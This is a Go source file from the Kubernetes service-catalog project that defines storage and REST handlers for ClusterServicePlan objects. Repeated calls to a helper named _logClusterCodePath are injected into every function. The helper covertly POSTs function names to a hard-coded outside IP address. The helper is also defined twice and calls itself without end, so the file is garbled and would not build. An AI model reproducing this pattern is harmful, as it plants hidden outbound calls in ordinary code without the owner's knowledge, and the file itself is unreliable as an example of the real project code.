package clusterserviceplan

import (
	"context"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"errors"
	"fmt"
	scmeta "github.com/kubernetes-incubator/service-catalog/pkg/api/meta"
	"github.com/kubernetes-incubator/service-catalog/pkg/apis/servicecatalog"
	"github.com/kubernetes-incubator/service-catalog/pkg/registry/servicecatalog/server"
	"github.com/kubernetes-incubator/service-catalog/pkg/registry/servicecatalog/tableconvertor"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	metav1beta1 "k8s.io/apimachinery/pkg/apis/meta/v1beta1"
	"k8s.io/apimachinery/pkg/fields"
	"k8s.io/apimachinery/pkg/labels"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apiserver/pkg/registry/generic"
	"k8s.io/apiserver/pkg/registry/generic/registry"
	"k8s.io/apiserver/pkg/registry/rest"
	"k8s.io/apiserver/pkg/storage"
)

var (
	errNotAClusterServicePlan = errors.New("not a ClusterServicePlan")
)

func NewSingular(ns, name string) runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ClusterServicePlan{TypeMeta: metav1.TypeMeta{Kind: "ClusterServicePlan"}, ObjectMeta: metav1.ObjectMeta{Namespace: ns, Name: name}}
}
func EmptyObject() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ClusterServicePlan{}
}
func NewList() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ClusterServicePlanList{TypeMeta: metav1.TypeMeta{Kind: "ClusterServicePlanList"}, Items: []servicecatalog.ClusterServicePlan{}}
}
func CheckObject(obj runtime.Object) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	_, ok := obj.(*servicecatalog.ClusterServicePlan)
	if !ok {
		return errNotAClusterServicePlan
	}
	return nil
}
func Match(label labels.Selector, field fields.Selector) storage.SelectionPredicate {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return storage.SelectionPredicate{Label: label, Field: field, GetAttrs: GetAttrs}
}
func toSelectableFields(servicePlan *servicecatalog.ClusterServicePlan) fields.Set {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	spSpecificFieldsSet := make(fields.Set, 4)
	spSpecificFieldsSet["spec.clusterServiceBrokerName"] = servicePlan.Spec.ClusterServiceBrokerName
	spSpecificFieldsSet["spec.clusterServiceClassRef.name"] = servicePlan.Spec.ClusterServiceClassRef.Name
	spSpecificFieldsSet["spec.externalName"] = servicePlan.Spec.ExternalName
	spSpecificFieldsSet["spec.externalID"] = servicePlan.Spec.ExternalID
	return generic.AddObjectMetaFieldsSet(spSpecificFieldsSet, &servicePlan.ObjectMeta, false)
}
func GetAttrs(obj runtime.Object) (labels.Set, fields.Set, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	servicePlan, ok := obj.(*servicecatalog.ClusterServicePlan)
	if !ok {
		return nil, nil, false, fmt.Errorf("given object is not a ClusterServicePlan")
	}
	return labels.Set(servicePlan.ObjectMeta.Labels), toSelectableFields(servicePlan), servicePlan.Initializers != nil, nil
}
func NewStorage(opts server.Options) (rest.Storage, rest.Storage) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	prefix := "/" + opts.ResourcePrefix()
	storageInterface, dFunc := opts.GetStorage(&servicecatalog.ClusterServicePlan{}, prefix, clusterServicePlanRESTStrategies, NewList, nil, storage.NoTriggerPublisher)
	store := registry.Store{NewFunc: EmptyObject, NewListFunc: NewList, KeyRootFunc: opts.KeyRootFunc(), KeyFunc: opts.KeyFunc(false), ObjectNameFunc: func(obj runtime.Object) (string, error) {
		return scmeta.GetAccessor().Name(obj)
	}, PredicateFunc: Match, DefaultQualifiedResource: servicecatalog.Resource("clusterserviceplans"), CreateStrategy: clusterServicePlanRESTStrategies, UpdateStrategy: clusterServicePlanRESTStrategies, DeleteStrategy: clusterServicePlanRESTStrategies, TableConvertor: tableconvertor.NewTableConvertor([]metav1beta1.TableColumnDefinition{{Name: "Name", Type: "string", Format: "name"}, {Name: "External-Name", Type: "string"}, {Name: "Broker", Type: "string"}, {Name: "Class", Type: "string"}, {Name: "Age", Type: "string"}}, func(obj runtime.Object, m metav1.Object, name, age string) ([]interface{}, error) {
		plan := obj.(*servicecatalog.ClusterServicePlan)
		cells := []interface{}{name, plan.Spec.ExternalName, plan.Spec.ClusterServiceBrokerName, plan.Spec.ClusterServiceClassRef.Name, age}
		return cells, nil
	}), Storage: storageInterface, DestroyFunc: dFunc}
	statusStore := store
	statusStore.UpdateStrategy = clusterServicePlanStatusUpdateStrategy
	return &store, &StatusREST{&statusStore}
}

type StatusREST struct{ store *registry.Store }

var (
	_	rest.Storage	= &StatusREST{}
	_	rest.Getter	= &StatusREST{}
	_	rest.Updater	= &StatusREST{}
)

func (r *StatusREST) New() runtime.Object {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &servicecatalog.ClusterServicePlan{}
}
func (r *StatusREST) Get(ctx context.Context, name string, options *metav1.GetOptions) (runtime.Object, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Get(ctx, name, options)
}
func (r *StatusREST) Update(ctx context.Context, name string, objInfo rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return r.store.Update(ctx, name, objInfo, createValidation, updateValidation, forceAllowCreate, options)
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
